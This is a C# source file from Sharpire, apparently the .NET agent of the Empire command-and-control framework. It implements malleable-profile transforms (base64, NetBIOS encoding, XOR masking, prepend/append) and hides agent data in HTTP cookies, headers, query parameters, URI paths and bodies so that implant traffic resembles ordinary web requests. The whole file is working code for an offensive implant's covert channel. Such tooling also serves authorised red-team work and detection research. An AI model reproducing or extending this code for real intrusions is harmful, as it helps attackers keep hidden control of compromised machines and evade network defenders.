using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace Sharpire
{
    // Forward + reverse transform chains and terminator placement/extraction for
    // v1 malleable profiles. Byte semantics mirror
    // empire/server/common/malleable/transformation.py so the agent round-trips
    // data byte-for-byte against the Empire malleable HTTP listener.
    internal static class MalleableTransform
    {
        // ISO-8859-1 maps every byte 0..255 to the Unicode code point of the
        // same value, preserving byte identity across string<->byte trips.
        // That's the Python server's latin-1 convention for transform values.
        private static readonly Encoding Latin1 = Encoding.GetEncoding(28591);

        public static byte[] Apply(List<TransformOp> ops, byte[] data)
        {
            byte[] buf = data ?? new byte[0];
            if (ops == null) return buf;
            foreach (TransformOp op in ops)
            {
                buf = ApplyOne(buf, op);
            }
            return buf;
        }

        public static byte[] Reverse(List<TransformOp> ops, byte[] data)
        {
            byte[] buf = data ?? new byte[0];
            if (ops == null) return buf;
            for (int i = ops.Count - 1; i >= 0; i--)
            {
                buf = ReverseOne(buf, ops[i]);
            }
            return buf;
        }

        private static byte[] ApplyOne(byte[] data, TransformOp op)
        {
            switch ((op.Op ?? "").ToLowerInvariant())
            {
                case "base64":
                {
                    string encoded = Convert.ToBase64String(data);
                    return Encoding.ASCII.GetBytes(encoded);
                }
                case "base64url":
                {
                    string encoded = Convert.ToBase64String(data);
                    return Encoding.ASCII.GetBytes(PercentEncodeBase64(encoded));
                }
                case "netbios":
                    return NetbiosEncode(data, (byte)'a');
                case "netbiosu":
                    return NetbiosEncode(data, (byte)'A');
                case "mask":
                {
                    byte key = DecodeMaskKey(op.Key);
                    return Xor(data, key);
                }
                case "prepend":
                {
                    byte[] val = DecodeTransformValue(op.Value);
                    byte[] outBuf = new byte[val.Length + data.Length];
                    Buffer.BlockCopy(val, 0, outBuf, 0, val.Length);
                    Buffer.BlockCopy(data, 0, outBuf, val.Length, data.Length);
                    return outBuf;
                }
                case "append":
                {
                    byte[] val = DecodeTransformValue(op.Value);
                    byte[] outBuf = new byte[data.Length + val.Length];
                    Buffer.BlockCopy(data, 0, outBuf, 0, data.Length);
                    Buffer.BlockCopy(val, 0, outBuf, data.Length, val.Length);
                    return outBuf;
                }
                case "print":
                case "":
                    return data;
                default:
                    // Unknown op — identity, matching gopire's defensive behavior
                    // (callers treat any failure as "fall back to legacy").
                    return data;
            }
        }

        private static byte[] ReverseOne(byte[] data, TransformOp op)
        {
            switch ((op.Op ?? "").ToLowerInvariant())
            {
                case "base64":
                {
                    string s = Encoding.ASCII.GetString(data);
                    return Convert.FromBase64String(PadBase64(s));
                }
                case "base64url":
                {
                    string s = Encoding.ASCII.GetString(data);
                    string unq = PercentDecode(s);
                    return Convert.FromBase64String(PadBase64(unq));
                }
                case "netbios":
                    return NetbiosDecode(data, (byte)'a');
                case "netbiosu":
                    return NetbiosDecode(data, (byte)'A');
                case "mask":
                {
                    byte key = DecodeMaskKey(op.Key);
                    return Xor(data, key);
                }
                case "prepend":
                {
                    byte[] val = DecodeTransformValue(op.Value);
                    if (data.Length < val.Length) return new byte[0];
                    byte[] outBuf = new byte[data.Length - val.Length];
                    Buffer.BlockCopy(data, val.Length, outBuf, 0, outBuf.Length);
                    return outBuf;
                }
                case "append":
                {
                    byte[] val = DecodeTransformValue(op.Value);
                    if (data.Length < val.Length) return new byte[0];
                    byte[] outBuf = new byte[data.Length - val.Length];
                    Buffer.BlockCopy(data, 0, outBuf, 0, outBuf.Length);
                    return outBuf;
                }
                case "print":
                case "":
                    return data;
                default:
                    return data;
            }
        }

        private static byte[] NetbiosEncode(byte[] data, byte baseByte)
        {
            byte[] outBuf = new byte[data.Length * 2];
            for (int i = 0; i < data.Length; i++)
            {
                outBuf[2 * i] = (byte)((data[i] >> 4) + baseByte);
                outBuf[2 * i + 1] = (byte)((data[i] & 0x0F) + baseByte);
            }
            return outBuf;
        }

        private static byte[] NetbiosDecode(byte[] data, byte baseByte)
        {
            // Python tolerates odd-length input via range(0, len, 2) — mirror by
            // truncating to the nearest pair.
            int n = data.Length - (data.Length % 2);
            byte[] outBuf = new byte[n / 2];
            for (int i = 0; i < n; i += 2)
            {
                int hi = data[i] - baseByte;
                int lo = data[i + 1] - baseByte;
                outBuf[i / 2] = (byte)(((hi & 0x0F) << 4) | (lo & 0x0F));
            }
            return outBuf;
        }

        private static byte DecodeMaskKey(string key)
        {
            if (string.IsNullOrEmpty(key) || key.Length < 2) return 0;
            return Convert.ToByte(key.Substring(0, 2), 16);
        }

        private static byte[] Xor(byte[] data, byte key)
        {
            byte[] outBuf = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                outBuf[i] = (byte)(data[i] ^ key);
            }
            return outBuf;
        }

        private static byte[] DecodeTransformValue(string v)
        {
            if (string.IsNullOrEmpty(v)) return new byte[0];
            try
            {
                return Convert.FromBase64String(PadBase64(v));
            }
            catch (FormatException)
            {
                return new byte[0];
            }
        }

        private static string PadBase64(string s)
        {
            if (string.IsNullOrEmpty(s)) return s;
            int pad = s.Length % 4;
            if (pad == 0) return s;
            return s + new string('=', 4 - pad);
        }

        // Python's urllib.parse.quote() with its default safe='/' encodes '+'
        // and '=' (among others) but leaves '/' alone. For our restricted
        // base64 alphabet A-Za-z0-9+/= only '+' and '=' need escaping.
        private static string PercentEncodeBase64(string s)
        {
            StringBuilder sb = new StringBuilder(s.Length);
            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];
                if (c == '+') sb.Append("%2B");
                else if (c == '=') sb.Append("%3D");
                else sb.Append(c);
            }
            return sb.ToString();
        }

        // PathEscape-equivalent: percent-encode every byte of the latin-1 string
        // except RFC 3986 unreserved chars (ALPHA / DIGIT / '-' / '.' / '_' / '~').
        // Matches Go's url.PathEscape and Python's urllib.parse.quote() default
        // with safe='' — crucially spaces become %20, NOT '+'.
        private static string PathEscape(string s)
        {
            if (string.IsNullOrEmpty(s)) return s ?? "";
            byte[] bytes = Latin1.GetBytes(s);
            StringBuilder sb = new StringBuilder(bytes.Length);
            for (int i = 0; i < bytes.Length; i++)
            {
                byte b = bytes[i];
                if ((b >= (byte)'A' && b <= (byte)'Z') ||
                    (b >= (byte)'a' && b <= (byte)'z') ||
                    (b >= (byte)'0' && b <= (byte)'9') ||
                    b == (byte)'-' || b == (byte)'.' || b == (byte)'_' || b == (byte)'~')
                {
                    sb.Append((char)b);
                }
                else
                {
                    sb.Append('%');
                    sb.Append(b.ToString("X2"));
                }
            }
            return sb.ToString();
        }

        // PathUnescape-equivalent: decode %xx sequences into raw bytes. Does
        // NOT treat '+' as space (that's QueryUnescape / unquote_plus), matching
        // Python's unquote_to_bytes.
        private static byte[] PathUnescapeBytes(string s)
        {
            if (string.IsNullOrEmpty(s)) return new byte[0];
            MemoryStream ms = new MemoryStream(s.Length);
            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];
                if (c == '%' && i + 2 < s.Length)
                {
                    byte hi, lo;
                    if (TryHex(s[i + 1], out hi) && TryHex(s[i + 2], out lo))
                    {
                        ms.WriteByte((byte)((hi << 4) | lo));
                        i += 2;
                        continue;
                    }
                }
                // Non-escape char — write its latin-1 byte.
                ms.WriteByte((byte)(c & 0xFF));
            }
            return ms.ToArray();
        }

        private static string PercentDecode(string s)
        {
            byte[] raw = PathUnescapeBytes(s);
            // base64url reverse needs an ASCII string to feed FromBase64String.
            // Latin-1 == one byte per char, so the bytes survive the char round trip.
            return Latin1.GetString(raw);
        }

        private static bool TryHex(char c, out byte v)
        {
            if (c >= '0' && c <= '9') { v = (byte)(c - '0'); return true; }
            if (c >= 'a' && c <= 'f') { v = (byte)(c - 'a' + 10); return true; }
            if (c >= 'A' && c <= 'F') { v = (byte)(c - 'A' + 10); return true; }
            v = 0;
            return false;
        }

        // Converts latin-1 bytes to a string where each byte becomes the Unicode
        // code point of the same value. Preserves byte identity for subsequent
        // escape/decode steps.
        private static string Latin1String(byte[] data)
        {
            return Latin1.GetString(data ?? new byte[0]);
        }

        public static void StoreTerminator(HttpWebRequest req, byte[] data, Terminator term, ref string requestUri)
        {
            if (term == null || string.IsNullOrEmpty(term.Type))
            {
                WriteBody(req, data);
                return;
            }

            switch (term.Type.ToLowerInvariant())
            {
                case "header":
                {
                    if (string.IsNullOrEmpty(term.Arg)) return;
                    string value;
                    if (string.Equals(term.Arg, "Cookie", StringComparison.OrdinalIgnoreCase))
                    {
                        // Server extract uses unquote_to_bytes which leaves '+' as
                        // a literal; PathEscape emits spaces as %20 (not '+') so
                        // the round-trip is byte-exact.
                        value = PathEscape(Latin1String(data));
                        req.Headers[HttpRequestHeader.Cookie] = value;
                    }
                    else
                    {
                        value = Latin1String(data);
                        SetHeader(req, term.Arg, value);
                    }
                    break;
                }
                case "parameter":
                {
                    if (string.IsNullOrEmpty(term.Arg)) return;
                    string encoded = PathEscape(Latin1String(data));
                    string separator = requestUri.IndexOf('?') >= 0 ? "&" : "?";
                    requestUri = requestUri + separator + term.Arg + "=" + encoded;
                    break;
                }
                case "uri-append":
                {
                    requestUri = requestUri + PathEscape(Latin1String(data));
                    break;
                }
                case "print":
                case "":
                    WriteBody(req, data);
                    break;
            }
        }

        private static void SetHeader(HttpWebRequest req, string name, string value)
        {
            // A few headers can't be set via the indexer on HttpWebRequest and
            // have to go through dedicated properties.
            switch (name.ToLowerInvariant())
            {
                case "user-agent":
                    req.UserAgent = value;
                    break;
                case "accept":
                    req.Accept = value;
                    break;
                case "referer":
                    req.Referer = value;
                    break;
                case "content-type":
                    req.ContentType = value;
                    break;
                case "host":
                    req.Host = value;
                    break;
                case "connection":
                case "content-length":
                case "transfer-encoding":
                case "expect":
                case "date":
                case "if-modified-since":
                case "range":
                    // Skip — these are managed by the framework.
                    break;
                default:
                    req.Headers[name] = value;
                    break;
            }
        }

        private static void WriteBody(HttpWebRequest req, byte[] data)
        {
            if (data == null || data.Length == 0) return;
            req.ContentLength = data.Length;
            using (Stream s = req.GetRequestStream())
            {
                s.Write(data, 0, data.Length);
            }
        }

        public static byte[] ExtractTerminator(HttpWebResponse resp, Terminator term, string[] registeredUris)
        {
            if (resp == null || term == null || string.IsNullOrEmpty(term.Type))
            {
                return new byte[0];
            }

            switch (term.Type.ToLowerInvariant())
            {
                case "header":
                {
                    if (string.IsNullOrEmpty(term.Arg)) return new byte[0];
                    string raw = resp.Headers[term.Arg];
                    if (string.IsNullOrEmpty(raw)) return new byte[0];
                    return PathUnescapeBytes(raw);
                }
                case "parameter":
                {
                    if (string.IsNullOrEmpty(term.Arg)) return new byte[0];
                    Uri u = resp.ResponseUri;
                    if (u == null) return new byte[0];
                    string raw = System.Web.HttpUtility.ParseQueryString(u.Query)[term.Arg];
                    if (string.IsNullOrEmpty(raw)) return new byte[0];
                    // ParseQueryString already percent-decodes, so return bytes directly.
                    return Latin1.GetBytes(raw);
                }
                case "uri-append":
                {
                    Uri u = resp.ResponseUri;
                    if (u == null) return new byte[0];
                    string path = u.AbsolutePath;
                    // Longest-prefix match — mirrors transaction.py:489-497.
                    List<string> sorted = new List<string>();
                    if (registeredUris != null)
                    {
                        foreach (string s in registeredUris)
                        {
                            if (!string.IsNullOrEmpty(s)) sorted.Add(s);
                        }
                    }
                    sorted.Sort(delegate(string a, string b) { return b.Length.CompareTo(a.Length); });
                    string lowerPath = path.ToLowerInvariant();
                    foreach (string known in sorted)
                    {
                        string lowerKnown = known.ToLowerInvariant();
                        int idx = lowerPath.IndexOf(lowerKnown, StringComparison.Ordinal);
                        if (idx >= 0 && path.Length > idx + known.Length)
                        {
                            string tail = path.Substring(idx + known.Length);
                            return PathUnescapeBytes(tail);
                        }
                    }
                    return new byte[0];
                }
                case "print":
                case "":
                {
                    using (Stream rs = resp.GetResponseStream())
                    {
                        if (rs == null) return new byte[0];
                        using (MemoryStream ms = new MemoryStream())
                        {
                            byte[] buf = new byte[4096];
                            int n;
                            while ((n = rs.Read(buf, 0, buf.Length)) > 0)
                            {
                                ms.Write(buf, 0, n);
                            }
                            return ms.ToArray();
                        }
                    }
                }
            }
            return new byte[0];
        }
    }
}
